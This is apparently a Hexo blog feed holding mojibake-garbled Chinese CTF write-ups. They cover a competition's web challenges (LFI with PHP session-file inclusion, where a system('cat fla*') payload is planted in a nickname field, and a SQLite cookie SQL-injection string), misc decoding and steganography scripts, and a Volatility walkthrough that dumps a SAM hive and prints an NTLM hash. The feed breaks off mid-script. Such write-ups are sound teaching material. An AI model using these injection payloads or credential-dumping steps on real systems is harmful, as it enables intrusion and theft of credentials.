        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ‰“èŠåŸçš„æ¯”èµ›ï¼Œåˆç™½ç»™äº†ï¼Œæ‹¿äº†å‚ä¸å¥–ï¼Œåšå‡ºæ¥ä¸¤ä¸ªmiscï¼Œå‰©ä¸‹ä¸¤ä¸ªmiscéƒ½åšäº†å¿«ä¸€åŠï¼Œæ²¡æ€è·¯äº†ï¼Œç‰¹æ¥å¤ç°ã€‚</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>æ‰“å¼€ä¹‹åæ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼ŒæŸ¥çœ‹æºç å‘ç°äº†æµ‹è¯•è´¦å·test/test</p><p>æŸ¥çœ‹robots.txt å‘ç°php.php å‘ç°æ˜¯phpinfoã€‚</p><p>ç™»å½•ä¹‹åå‘ç°å¯èƒ½å­˜åœ¨LFIï¼Œç„¶åä¸Šäº†ä¸‹æ‰«æå™¨ï¼Œæ‰«åˆ°äº†ä¸€äº›æ–‡ä»¶ï¼Œå°è¯•åŒ…å«info.phpï¼Œå¾—åˆ°æºç ï¼Œç„¶åå‘ç°äº†includeäº†template/info.htmlï¼Œäºæ˜¯è®¿é—®ã€‚æŸ¥çœ‹æºç å‘ç°äº†hint m4nageee.phpã€‚ç„¶åè¯»manageçš„æºç ï¼Œåœ¨æºç ä¸­å‘ç°åŒ…å«äº†2333.htmlï¼Œäºæ˜¯è®¿é—®ã€‚</p><p>æŸ¥çœ‹æºç æ—¶å‘ç°äº†phpä»£ç ï¼Œå°è¯•PHP sessionæ–‡ä»¶åŒ…å«ã€‚</p><p>ä½†æ˜¯éœ€è¦sessionçš„å­˜æ”¾ä½ç½®ï¼Œäºæ˜¯é€šè¿‡æ‰«æåˆ°çš„php.phpæŸ¥çœ‹sessionæ—¥å¿—çš„å­˜æ”¾ä½ç½®/var/lib/php5ï¼Œé‚åŒ…å«ä¹‹ã€‚</p><p>åœ¨m4nageeeé‡Œé¢å†™nicknameåˆ°sessionæ–‡ä»¶é‡Œé¢ï¼Œåˆ©ç”¨LFIåŒ…å«getshellã€‚</p><p>å½“å‰æˆ‘çš„phpsessidä¸º0u335c2ud2h9gjq0lq6nos1i72</p><p>æ‰€ä»¥sessionæ–‡ä»¶å°±æ˜¯/var/lib/php5/sess_0u335c2ud2h9gjq0lq6nos1i72,åŒ…å«å³å¯ã€‚</p><p>nikenameé‡Œé¢å†™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> system(<span class="string">&quot;cat fla*&quot;</span>)ï¼› <span class="meta">?&gt;</span></span><br><span class="line"> å³å¯ç»•è¿‡å¯¹flagçš„è¿‡æ»¤</span><br><span class="line"></span><br><span class="line">æˆ–è€…è¿™æ ·å†™</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;cat fl\ag_0ba7bc92fcd57e337ebb9e74308c811f&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ç­‰ç­‰ã€‚ã€‚</span><br></pre></td></tr></table></figure><h2 id="web2-web3"><a href="#web2-web3" class="headerlink" title="web2 web3"></a>web2 web3</h2><p>é¢˜ç›®æç¤ºä½¿ç”¨sqlmapæ³¨å…¥ï¼Œä½†æ˜¯æˆ‘æ³¨å…¥å·¨æ‹‰è·¨ã€‚ã€‚è€Œä¸”æ•°æ®åº“æ˜¯sqliteçš„ï¼Œæˆ‘åªä¼šä¸€ç‚¹mysqlçš„æ³¨å…¥ã€‚ã€‚å½“æ—¶æ²¡åšå‡ºæ¥ï¼Œèµ›åå¤ç°ä¸‹ã€‚</p><p>è¿™é¢˜æ˜¯ä½¿ç”¨cookieæ³¨å…¥ã€‚æˆ‘æ˜ç¡®åœ°çŸ¥é“è‡ªå·±ä¸ä¼šç”¨sqlmapè¿›è¡Œcookieæ³¨å…¥ã€‚</p><h3 id="ä¸ä¼š-è·Ÿå®˜æ–¹çš„æ€è·¯æ²¡å¤ç°å‡ºæ¥ï¼Œç­‰wpã€‚"><a href="#ä¸ä¼š-è·Ÿå®˜æ–¹çš„æ€è·¯æ²¡å¤ç°å‡ºæ¥ï¼Œç­‰wpã€‚" class="headerlink" title="ä¸ä¼š è·Ÿå®˜æ–¹çš„æ€è·¯æ²¡å¤ç°å‡ºæ¥ï¼Œç­‰wpã€‚"></a>ä¸ä¼š è·Ÿå®˜æ–¹çš„æ€è·¯æ²¡å¤ç°å‡ºæ¥ï¼Œç­‰wpã€‚</h3><p>è¿™é‡Œæ”¾ä¸‹æµå¤§å¸ˆå‚…çš„web2 web3çš„payloadï¼š</p><p>Cookie: PHPSESSID=da55nb2kgsge2luvc5m53k5r90; username=test; password=testâ€™ OR 1=1 LIMIT 1 OFFSET 1 â€“ </p><p>password=testâ€™ OR 1=1 LIMIT 1 OFFSET 1 â€“ ; userinfo=eyJ1c2VybmFtZSI6InRlc3QiLCJwYXNzd29yZCI6InRlc3QnIE9SIDE9MSBMSU1JVCAxIE9GRlNFVCAxIC0tICJ9Cg%3D%3D</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ez-decode"><a href="#ez-decode" class="headerlink" title="ez_decode"></a>ez_decode</h2><p>ç®€å•çš„ç¼–ç è½¬æ¢ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#54;&amp;#54;&amp;#54;&amp;#99;&amp;#54;&amp;#49;&amp;#54;&amp;#55;&amp;#55;&amp;#98;&amp;#54;&amp;#54;&amp;#51;&amp;#57;&amp;#54;&amp;#52;&amp;#54;&amp;#54;&amp;#51;&amp;#53;&amp;#51;&amp;#52;&amp;#51;&amp;#48;&amp;#51;&amp;#49;&amp;#51;&amp;#48;&amp;#51;&amp;#48;&amp;#51;&amp;#56;&amp;#51;&amp;#51;&amp;#54;&amp;#50;&amp;#51;&amp;#48;&amp;#54;&amp;#54;&amp;#51;&amp;#49;&amp;#54;&amp;#54;&amp;#51;&amp;#50;&amp;#51;&amp;#51;&amp;#54;&amp;#49;&amp;#51;&amp;#51;&amp;#54;&amp;#53;&amp;#54;&amp;#49;&amp;#54;&amp;#53;&amp;#54;&amp;#51;&amp;#54;&amp;#51;&amp;#51;&amp;#53;&amp;#54;&amp;#52;&amp;#51;&amp;#53;&amp;#54;&amp;#49;&amp;#51;&amp;#55;&amp;#54;&amp;#51;&amp;#55;&amp;#100;</span><br></pre></td></tr></table></figure><p>htmlå®ä½“ç¼–ç -&gt;hexo2string-&gt;flag</p><p>flag{f9df54010083b0f1f23a3eaecc5d5a7c}</p><h2 id="qr-code"><a href="#qr-code" class="headerlink" title="qr_code:"></a>qr_code:</h2><img src="http://cdn.polowong.top/static/images/qrcode.png"><p>æ‰“å¼€å¾ˆå¤šäºŒç»´ç ï¼Œç›²çŒœæ‰«å‡ºæ¥å†…å®¹è½¬0å’Œ1</p><p>æ¯”èµ›çš„æ—¶å€™æœ‰ä¸ªç®€å•çš„è¯»äºŒç»´ç çš„å·¥å…·ï¼Œä½†æ˜¯æ‰¹é‡ä¸ä¼šå†™è„šæœ¬ã€‚ã€‚å°±è¯»äº†ä¸¤ä¸ªï¼Œçœ‹å“ªä¸ªæ˜¯0å“ªä¸ªæ˜¯1ï¼Œç„¶åbin2asciiå°±å¯ä»¥äº†ã€‚</p><p>ç”¨è„šæœ¬çš„åšæ³•ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  -*-coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span>  os</span><br><span class="line"><span class="keyword">import</span>  zxing</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">reader=zxing.BarCodeReader()</span><br><span class="line">asc=<span class="string">&#x27;&#x27;</span></span><br><span class="line">path=<span class="string">&quot;C:\\Users\\Administrator\\Desktop\\èŠåŸ\\qrcode&quot;</span></span><br><span class="line">files=os.listdir(path)</span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span>  <span class="built_in">range</span> (<span class="number">0</span>,<span class="built_in">len</span>(files)-<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># try:</span></span><br><span class="line">    <span class="comment">#         content=reader.decode(file).raw</span></span><br><span class="line">    <span class="comment">#         if content==&quot;zero&quot;:</span></span><br><span class="line">    <span class="comment">#             asc+=str(0) #è¿™æ˜¯è¯†åˆ«äºŒç»´ç çš„æ–¹æ³•</span></span><br><span class="line">    <span class="comment">#         if content==&quot;one&quot;:</span></span><br><span class="line">    <span class="comment">#             asc+=str(1)</span></span><br><span class="line">    <span class="comment"># except:</span></span><br><span class="line">    <span class="comment">#     pass</span></span><br><span class="line">    size=os.path.getsize(<span class="built_in">str</span>(i)+<span class="string">&quot;.png&quot;</span>)</span><br><span class="line">   <span class="comment">#è¿™æ˜¯ä½¿ç”¨filesizeåšçš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">if</span> size==<span class="number">3409</span>:</span><br><span class="line">        asc+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        asc+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">asc=<span class="built_in">int</span>(asc,base=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(asc)</span><br><span class="line">asc=<span class="built_in">hex</span>(asc)</span><br><span class="line">asc=asc[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_hex(asc).decode())</span><br></pre></td></tr></table></figure><p>flag{duyoulikeit}</p><h2 id="relax"><a href="#relax" class="headerlink" title="relax"></a>relax</h2><p>æ‰“å¼€æ˜¯ä¸ª.flagç»“å°¾çš„æ–‡ä»¶ï¼Œä¸¢è¿›010editorçœ‹è§æ˜¯PKå¼€å¤´ï¼Œè€ƒè™‘zipï¼Œè§£å‹å‡ºæ¥ä¸€ä¸ªflag.txt ä¸€ä¸ªéŸ³é¢‘ã€‚</p><p>flagtxté‡Œé¢çš„base64è§£å‡ºæ¥å•¥ä¹Ÿä¸æ˜¯ï¼Œäºæ˜¯ç»§ç»­çœ‹éŸ³é¢‘ã€‚</p><p>è€ƒè™‘éŸ³é¢‘éšå†™ï¼Œåœ¨æ–‡ä»¶è¯¦ç»†ä¿¡æ¯é‡Œé¢å‘ç°äº†ä¸€ä¸²base64,è§£ç åæ‰“å¼€mp3stegoï¼Œè¾“å…¥è¿™ä¸ªå¯†ç ï¼Œå¾—åˆ°äº†ä¸€ä¸²fakeflagï¼š</p><p>fakeflag{same_length_with_true_flaghh}</p><p>å’ŒçœŸçš„é•¿çš„ä¸€æ ·å‘¢ï¼ŒçœŸçœŸå‡å‡</p><p>åé¢å°±æ²¡æ€è·¯äº†ã€‚</p><p>åæ¥çœ‹å¸ˆå‚…çš„wpè¯´éœ€è¦è®²è¯¥å­—ç¬¦ä¸²ä¸ä¹‹å‰è§£å‡ºæ¥å•¥ä¹Ÿä¸æ˜¯çš„base64å¼‚æˆ–å°±å¯ä»¥å¾—åˆ°flagã€‚è‰ã€‚</p><p>ä¸Šè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span>  f:</span><br><span class="line">    str1=f.readline()</span><br><span class="line">str1=base64.b64decode(str1)</span><br><span class="line">fakeflag=<span class="string">&quot;fakeflag&#123;same_length_with_true_flaghh&#125;&quot;</span>.encode()</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(fakeflag)):</span><br><span class="line">    tmp=fakeflag[i]^str1[i]</span><br><span class="line">    flag+=<span class="built_in">chr</span>(tmp)</span><br><span class="line"><span class="built_in">print</span>( flag)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šencode()æ–¹æ³•æ˜¯strç±»å‹æä¾›çš„ï¼Œå°†å…¶è½¬æ¢ä¸ºbyteç±»å‹ã€‚decodeï¼ˆï¼‰æ–¹æ³•æ˜¯å°†byteç±»å‹è½¬åŒ–ä¸ºstrç±»å‹ã€‚ä¹‹å‰æˆ‘éƒ½æ˜¯å‡ºé”™äº†å°±ç›´æ¥çencodeï¼Œdecodeï¼Œå’‹å¯¹å’‹å¼„ã€‚ã€‚ä»Šå¤©ç»ˆäºçŸ¥é“äº†ã€‚</p><p>flagï¼šflag{9ff3a239027a7089237686b384862d33}</p><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>base64å¥—å¨ƒï¼Œå…‰æƒ³ç€basecrackï¼Œç»“æœç›´æ¥å¡æ­»ã€‚ã€‚å°±æ˜¯æ²¡æƒ³èµ·æ¥è‡ªå·±å†™è„šæœ¬ã€‚</p><p>é™„ä¸Šhxdçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&quot;base.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span>  f:</span><br><span class="line">    content=f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content=base64.b16decode(content).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;b16&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content=base64.b32decode(content).decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b32&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                content=base64.b64decode(content).decode()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;b64&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    content=base64.b85decode(content).decode()</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;b85&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>flag:flag{4b057431c3ee0c4f56d4dad18c352375}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å–è¯ä¸“é¢˜</title>
      <link href="2020/11/17/%E5%8F%96%E8%AF%81%E4%B8%93%E9%A2%98/"/>
      <url>2020/11/17/%E5%8F%96%E8%AF%81%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>å–è¯éœ€è¦ç”¨åˆ°çš„å·¥å…·ï¼š</p><p>volatilityã€æ³¨å†Œè¡¨åˆ†æå·¥å…·ï¼ˆWRRï¼‰ã€AXIOMç­‰ã€‚</p><h1 id="ä¾‹é¢˜åˆ†æ"><a href="#ä¾‹é¢˜åˆ†æ" class="headerlink" title="ä¾‹é¢˜åˆ†æ"></a>ä¾‹é¢˜åˆ†æ</h1><h2 id="æ¹–æ¹˜æ¯misc"><a href="#æ¹–æ¹˜æ¯misc" class="headerlink" title="æ¹–æ¹˜æ¯misc"></a>æ¹–æ¹˜æ¯misc</h2><p>é¦–å…ˆçœ‹ä¸€ä¸‹imageinfo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem  imageinfo</span><br></pre></td></tr></table></figure><p>é€‰æ‹©ä¸€ä¸ªsupported  profileï¼Œè¿™é‡Œé€‰ç¬¬ä¸€ä¸ªä¸è¡Œï¼Œæ‰€ä»¥é€‰ç¬¬äºŒä¸ªWin2003SP2x86</p><p>å…ˆæ‰«ä¸€ä¸‹pslist</p><p>volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem  â€“profile=Win2003SP2x86 pslist</p><p>é™¤äº†winlogon.exeä¹‹å¤–æ²¡å•¥æ”¶è·ï¼Œç„¶åæ‰«ä¸€ä¸‹ç½‘ç»œï¼Œä¹Ÿæ²¡å•¥æ”¶è·ã€‚</p><p>åé¢å°è¯•æ‰«æconnscanï¼Œcmdscanï¼Œnotepadã€‚</p><p>åœ¨æ‰«notepadçš„æ—¶å€™å‘ç°äº†ä¸€äº›ä¸œè¥¿ï¼Œäºæ˜¯å°è¯•æ‰«ä¸€ä¸‹åç¼€ä¸º.txtçš„æ–‡ä»¶ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æ”¶è·ã€‚</p><img src="http://cdn.polowong.top/static/images/hxbmisc1.jpg"><p>å‘ç°äº†ä¸€ä¸ªfile.txtï¼Œå°è¯•dumpåˆ°æœ¬åœ°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem  --profile&#x3D;Win2003SP2x86 dumpfiles -Q 0x000000000412cde0 -D .&#x2F;</span><br></pre></td></tr></table></figure><p>dumpä¸‹æ¥çš„æ–‡ä»¶å†…å®¹ä¸º</p><p>ä»€ä¹ˆï¼Ÿè®¡ç®—æœºåˆè¢«ä¸çŸ¥åè´¦æˆ·ç™»å½•äº†ï¼Ÿæ˜æ˜åœ¨è®¡ç®—æœºç®¡ç†ä¸­æ²¡æœ‰è¿™ä¸ªç”¨æˆ·ï¼Œä¸ºä»€ä¹ˆè¿˜ä¼šè¢«è¿™ä¸ªç”¨æˆ·ç™»å½•å‘¢ï¼Ÿç”µè„‘è·Ÿå‰çš„ä½ èƒ½å¸®æˆ‘æ‰¾åˆ°åŸå› å—ï¼Ÿflagä¸ºè¯¥ç”¨æˆ·çš„ç”¨æˆ·åä»¥åŠå¯†ç çš„md5å€¼ã€‚</p><p>æ ¼å¼ï¼šmd5(ç”¨æˆ·å:å¯†ç ï¼‰</p><p>ä¸‹é¢è€ƒè™‘åœ¨æ³¨å†Œè¡¨ä¸­æ‰¾ä¸€ä¸‹éšè—ç”¨æˆ·ã€‚</p><p>é¦–å…ˆçœ‹ä¸€ä¸‹æ³¨å†Œè¡¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem  --profile&#x3D;Win2003SP2x86 hivelist volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem  --profile&#x3D;Win2003SP2x86 hivelist</span><br></pre></td></tr></table></figure><p>å‘ç°äº†SAMè¡¨ã€‚SAMè¡¨æ˜¯å­˜å‚¨äº†ç”µè„‘ç™»å½•ç”¨æˆ·ç›¸å…³ä¿¡æ¯çš„è¡¨ï¼Œå°è¯•dumpå‡ºSAMè¡¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem  --profile&#x3D;Win2003SP2x86 dumpregistry -D .&#x2F;</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨æ³¨å†Œè¡¨åˆ†æå·¥å…·æ‰“å¼€ã€‚</p><img src="http://cdn.polowong.top/static/images/hxbmisc2.jpg"><p>å¯ä»¥çœ‹åˆ°å¾ˆå¤šéšè—è´¦æˆ·ï¼Œä¸€ä¸ªä¸ªçœ‹çœ‹æ˜¯å¦æœ‰last logon è¿™ä¸ªå±æ€§ã€‚</p><p>æœ€åæ‰¾åˆ°äº†ç”¨æˆ· FHREhpeï¼Œç„¶åå†å›åˆ°volatilityé‡Œé¢hashdump å‡ºæ¥å…³äºä»–çš„è´¦å·å¯†ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ç”¨æˆ·åæ³¨å†Œè¡¨.vmem  --profile&#x3D;Win2003SP2x86 hashdump | grep FHREhpe</span><br><span class="line">æœ‰å¦‚ä¸‹æ•°æ®ï¼š</span><br><span class="line">FHREhpe$:1171:70fdb8f853bd427d7584248b8d2c9f9e:f3cf477fc3ea6ec0b3b5887616dd4506:::</span><br></pre></td></tr></table></figure><p>  <em>Windows</em>ç³»ç»Ÿä¸‹çš„<em>hash</em>å¯†ç æ ¼å¼ä¸ºï¼šç”¨æˆ·åç§°*:RID:LM-HASH<em>å€¼</em>:NT-HASH*å€¼ </p><p>è·å¾—NT HASHå€¼åå¯ä»¥å»md5ç½‘ç«™è§£å¯†ï¼Œè§£å¯†åçš„å¯†ç æ˜¯NIAIWOMA</p><p>ç„¶åå°†å…¶MD5åŠ å¯†åå³å¯è·å¾—flagã€‚</p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://bbs.ichunqiu.com/thread-59102-1-1.html">https://bbs.ichunqiu.com/thread-59102-1-1.html</a></p><p><a href="https://www.sqlsec.com/2019/11/winhash.html">https://www.sqlsec.com/2019/11/winhash.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> å–è¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1104å­¦ä¹ ç¬”è®°</title>
      <link href="2020/11/09/1104%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/11/09/1104%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="pythonæ–‡ä»¶åç¼–è¯‘"><a href="#pythonæ–‡ä»¶åç¼–è¯‘" class="headerlink" title="pythonæ–‡ä»¶åç¼–è¯‘"></a>pythonæ–‡ä»¶åç¼–è¯‘</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E010000007300000000</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨010editorç¼–è¾‘ï¼Œpaste from hexï¼Œç„¶åå¦å­˜ä¸º1.pycã€‚<br>pythonå®‰è£…uncompyle  , pip install uncompyle<br>ä¸‹é¢å°±æ˜¯ uncompyle 1.pyc&gt;1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="built_in">str</span> = [</span><br><span class="line">     <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">56</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">49</span>, <span class="number">101</span>, <span class="number">55</span>, <span class="number">125</span>]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> flag</span><br><span class="line">flag()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾—flag</p><h1 id="base64éšå†™"><a href="#base64éšå†™" class="headerlink" title="base64éšå†™"></a>base64éšå†™</h1><p>è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="built_in">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += <span class="built_in">bin</span>(diff)[<span 